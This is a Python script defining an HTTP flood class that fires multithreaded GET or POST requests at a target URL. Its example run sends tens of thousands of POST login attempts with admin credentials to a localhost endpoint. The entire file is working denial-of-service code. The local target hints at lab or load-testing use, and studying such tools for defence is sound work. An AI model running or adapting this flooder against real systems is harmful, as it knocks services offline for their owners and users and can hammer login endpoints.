# Docstring: Class to perform http get flood attack
# and http post flood attack on a target url
# author: Jacob Zhang, 2024/6/14

import requests
import threading
class Http_flood():
    """
    Class to perform an HTTP flood attack on a target url
    params:
        target_url: the url of the target website
        count: number of requests to send in one thread.so the total number of requests
            will be thread_num*count
        time_out: max time to wait for a response
        print_frequency: how often to print the number of requests sent
    methods:
        send_http_requests: sends a number of http requests to the target url
        multithreading_HTTP_requests: sends a number of http requests to
            the target url using multiple threads
    """

    def __init__(self,
                 target_url: str = None,
                 count=100,
                 time_out=0.5,
                 print_frequency=10,
                 time=1):
        self.target_url = target_url
        self.count = count
        self.time_out = time_out
        self.print_frequency = print_frequency
        self.session = requests.Session()
        self.sleep_time = time
    def multithreading_HTTP_requests(self,
                                     thread_num=50,
                                     attack_type='GET',
                                     attack_data=None):
        """
        function to send http requests to a target url using multiple threads
        params:
            thread_num: number of threads to use
            attack_type: the type of http request to send (GET or POST)
            attack_data: the data to send with the POST request.
                         GET request does not need data
        """
        # threads list
        threads = []
        for i in range(thread_num):
            t = threading.Thread(target=self.send_http_requests, args=(attack_type, attack_data))
            t.start()
            threads.append(t)

        # Wait for all threads to complete
        for thread in threads:
            thread.join()

    def send_http_requests(self, attack_type='GET', data=None):
        """
        function to send http requests to a target url
        self.count: number of requests to send
        self.timeout: max time to wait for a response
        self.print_frequency: how often to print the number of requests sent
        commonly used response code list:
            200 OK
            403 Forbidden
            404 Not Found
            500 Internal Server Error
        """
        if attack_type == 'GET':
            for i in range(self.count):
                try:
                    # Send a GET request and ignore the response
                    if i % self.print_frequency == 0:
                        _ = self.session.get(self.target_url, timeout=self.time_out)
                        print(f"Sent {i} requests,responses code: {_.status_code}")
                    else:
                        _ = self.session.get(self.target_url, timeout=self.time_out)
                except requests.exceptions.RequestException as e:
                    # Print error message
                    print("Request failed:", e)
        elif attack_type == 'POST':
            for i in range(self.count):
                try:
                    # Send a GET request and ignore the response
                    if i % self.print_frequency == 0:
                        _ = self.session.post(self.target_url, timeout=self.time_out, data=data)
                        print(f"Sent {i} requests,responses code: {_.status_code}")
                    else:
                        _ = self.session.post(self.target_url, timeout=self.time_out, data=data)
                except requests.exceptions.RequestException as e:
                    # Print error message
                    print("Request failed:", e)


if __name__ == '__main__':
    # Target URL
    target_url = "http://127.0.0.1:5000/login_cert"

    flood = Http_flood(target_url, count=20000, time_out=1, print_frequency=200)
    flood.multithreading_HTTP_requests(thread_num=2, attack_type='POST',
                                       attack_data={"username": "admin", "password": "1"})
